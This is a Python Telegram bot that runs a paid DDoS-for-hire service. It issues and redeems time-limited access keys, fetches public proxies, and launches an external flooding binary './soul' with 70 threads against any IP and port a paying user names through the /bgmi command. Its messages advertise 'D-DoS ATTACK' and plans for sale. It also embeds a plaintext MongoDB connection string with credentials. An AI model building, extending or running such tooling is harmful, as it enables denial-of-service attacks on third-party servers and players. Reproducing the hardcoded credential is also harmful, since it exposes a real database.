from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import subprocess
import json
import random
import string
import datetime
import certifi
from pymongo import MongoClient

from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

DEFAULT_THREADS = 70
users = {}  # In-memory storage for users
keys = {}   # In-memory storage for keys
user_processes = {}
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Command to generate a new key with a specified duration
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                response = f"𝐊𝐞𝐲 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝: {key}\n𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐨𝐧: {expiration_date}"
            except ValueError:
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐩𝐞𝐜𝐢𝐟𝐲 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐭𝐢𝐦𝐞 (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐔𝐒𝐄."

    await update.message.reply_text(response)

# Command to redeem a key
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            users[user_id] = expiration_date
            del keys[key]
            response = f"✅𝗞𝗲𝘆 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!"
        else:
            response = "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐤𝐞𝐲. 𝐁𝐮𝐲 𝐟𝐫𝐨𝐦 @."
    else:
        response = "Usage: /redeem <key>"

    await update.message.reply_text(response)

# Command to list all users
async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id), request_kwargs={'proxies': get_proxy_dict()})
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐔𝐒𝐄."
    await update.message.reply_text(response)

# BGMI attack command
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐍𝐎 𝐀𝐂𝐓𝐈𝐕𝐄 𝐊𝐄𝐘. 𝐁𝐔𝐘 𝐅𝐑𝐎𝐌 @.")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    command = ['./soul', target_ip, port, duration, str(DEFAULT_THREADS)]
    process = subprocess.Popen(command)
    
    user_processes[user_id] = {"process": process, "command": command, "target_ip": target_ip, "port": port}
    
    await update.message.reply_text(f'Flooding parameters set :  {target_ip}:{port} For {duration}:{DEFAULT_THREADS}\nAttack Running.')

# Start command to check or start an attack
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("👋🏻WELCOME TO D-DoS ATTACK.\nDM FOR BUY PLAN @.")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('𝐍𝐨 𝐟𝐥𝐨𝐨𝐝𝐢𝐧𝐠 𝐩𝐚𝐫𝐚𝐦𝐞𝐭𝐞𝐫𝐬 𝐬𝐞𝐭. 𝐔𝐬𝐞 /bgmi 𝐭𝐨 𝐬𝐞𝐭 𝐩𝐚𝐫𝐚𝐦𝐞𝐭𝐞𝐫𝐬.')
        return

    if user_processes[user_id]["process"].poll() is None:
        await update.message.reply_text('🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆 🚀')
        return

    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
    await update.message.reply_text('🚀 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐀𝐓𝐓𝐀𝐂𝐊 🚀.')

# Stop an ongoing attack
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐍𝐎 𝐀𝐂𝐓𝐈𝐕𝐄 𝐊𝐄𝐘.")
        return

    if user_id in user_processes and user_processes[user_id]["process"].poll() is None:
        user_processes[user_id]["process"].terminate()
        await update.message.reply_text('🛑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐎𝐏𝐏𝐄𝐃 🛑.')
    else:
        await update.message.reply_text('❌ 𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐎𝐔𝐍𝐃.')

# Main function to run the bot
if __name__ == '__main__':
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("allusers", allusers))

    application.run_polling()
